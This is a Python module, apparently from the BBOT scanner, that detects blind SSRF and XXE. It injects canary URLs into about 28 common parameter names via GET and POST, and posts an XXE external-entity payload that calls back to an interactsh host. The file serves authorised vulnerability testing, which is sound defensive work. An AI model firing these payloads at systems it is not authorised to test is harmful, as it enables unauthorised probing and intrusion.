from .blind_ssrf import blind_ssrf, BaseSubmodule
from bbot.core.errors import InteractshError


ssrf_params = [
    "dest",
    "redirect",
    "uri",
    "path",
    "continue",
    "url",
    "window",
    "next",
    "data",
    "reference",
    "site",
    "html",
    "val",
    "validate",
    "domain",
    "callback",
    "return",
    "page",
    "feed",
    "host",
    "port",
    "to",
    "out",
    "view",
    "dir",
    "show",
    "navigation",
    "open",
]


class Generic_SSRF(BaseSubmodule):

    technique_description = "Generic SSRF (GET)"
    severity = "HIGH"

    def set_base_url(self, event):
        return event.data

    def create_paths(self):

        query_string = ""
        for param in ssrf_params:
            query_string += f"{param}=http://SSRF_CANARY&"

        query_string_upper = ""
        for param in ssrf_params:
            query_string_upper += f"{param.upper()}=http://SSRF_CANARY&"

        return [f"?{query_string.rstrip('&')}", f"?{query_string_upper.rstrip('&')}"]


class Generic_SSRF_POST(BaseSubmodule):

    technique_description = "Generic SSRF (POST)"
    severity = "HIGH"

    def set_base_url(self, event):
        return event.data

    def test(self, event):

        test_url = f"{event.data}"

        subdomain_tag = self.parent_module.helpers.rand_string(4)
        post_data = {}
        for param in ssrf_params:
            post_data[param] = f"http://{subdomain_tag}.{self.parent_module.interactsh_domain}"

        subdomain_tag_upper = self.parent_module.helpers.rand_string(4)
        post_data_upper = {
            k.upper(): f"http://{subdomain_tag_upper}.{self.parent_module.interactsh_domain}"
            for k, v in post_data.items()
        }

        post_data_list = [post_data, post_data_upper]

        for pd in post_data_list:
            r = self.parent_module.helpers.curl(url=test_url, method="POST", post_data=pd)
            self.process(event, r, subdomain_tag)


class Generic_XXE(BaseSubmodule):

    technique_description = "Generic XXE"
    severity = "HIGH"
    paths = None

    def test(self, event):

        subdomain_tag = self.parent_module.helpers.rand_string(4)

        post_body = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://SSRF_CANARY" >
]>
<foo>&xxe;</foo>""".replace(
            "SSRF_CANARY", f"{subdomain_tag}.{self.parent_module.interactsh_domain}"
        )
        test_url = f"{event.parsed.scheme}://{event.parsed.netloc}/"
        r = self.parent_module.helpers.curl(
            url=test_url, method="POST", raw_body=post_body, headers={"Content-type": "application/xml"}
        )
        if r:
            self.process(event, r, subdomain_tag)


class generic_ssrf(blind_ssrf):

    watched_events = ["URL"]
    produced_events = ["VULNERABILITY"]
    flags = ["active", "aggressive", "web"]
    in_scope_only = True

    def setup(self):

        self.interactsh_subdomain_tags = {}
        self.severity = None
        self.generic_only = self.config.get("generic_only", False)

        if self.scan.config.get("interactsh_disable", False) == False:
            try:
                self.interactsh_instance = self.helpers.interactsh()
                self.interactsh_domain = self.interactsh_instance.register()
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")
                return False
        else:
            self.warning(
                "The generic_ssrf module is completely dependent on interactsh to function, but it is disabled globally. Aborting."
            )
            return False

        # instantiate submodules
        self.submodules = {}

        for m in BaseSubmodule.__subclasses__():
            if m.__name__.startswith("Generic_"):
                self.verbose(f"Starting blind_ssrf submodule: {m.__name__}")
                self.submodules[m.__name__] = m(self)

        return True

    def handle_event(self, event):
        self.test_submodules(self.submodules, event)
